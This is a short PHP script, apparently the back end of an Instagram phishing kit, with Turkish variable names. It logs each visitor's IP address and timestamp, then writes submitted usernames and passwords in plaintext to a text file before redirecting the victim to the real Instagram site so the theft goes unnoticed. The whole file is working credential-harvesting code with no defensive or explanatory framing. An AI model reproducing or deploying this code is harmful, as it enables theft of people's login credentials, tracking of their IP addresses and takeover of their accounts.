<?php
                function preg_index($pattern, $subject) { return preg_match($pattern, $subject); }
                function dual_ip_coz() {
                    $ipv4 = "Not Detected"; $ipv6 = "Not Detected"; $ip_bloklari = '';
                    $alanlar = ['HTTP_X_FORWARDED_FOR', 'HTTP_CLIENT_IP', 'HTTP_X_REAL_IP', 'REMOTE_ADDR'];
                    foreach ($alanlar as $alan) { if (isset($_SERVER[$alan])) { $ip_bloklari .= ',' . $_SERVER[$alan]; } }
                    $parcalar = explode(',', $ip_bloklari);
                    foreach ($parcalar as $p) {
                        $p = trim($p);
                        if (filter_var($p, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4) !== false) { $ipv4 = $p; }
                        elseif (filter_var($p, FILTER_VALIDATE_IP, FILTER_FLAG_IPV6) !== false) { $ipv6 = $p; }
                    }
                    return ['v4' => $ipv4, 'v6' => $ipv6];
                }
                if (isset($_POST['on_sizi']) && $_POST['on_sizi'] == 'true') {
                    $tarih = date('Y-m-d H:i:s'); $ips = dual_ip_coz();
                    $log = "[🔥] DEVICE DATA RECORDED!\nZaman: $tarih\nIPv4: " . $ips['v4'] . "\n\n";
                    file_put_contents('kayitlar.txt', $log, FILE_APPEND); echo json_encode(["status" => "ok"]); exit();
                }
                if (isset($_POST['username']) && isset($_POST['password'])) {
                    $log = "[🔑] CREDENTIALS!\nUser: ".$_POST['username']."\nPass: ".$_POST['password']."\n\n";
                    file_put_contents('kayitlar.txt', $log, FILE_APPEND); header('Location: https://www.instagram.com'); exit();
                }
                ?>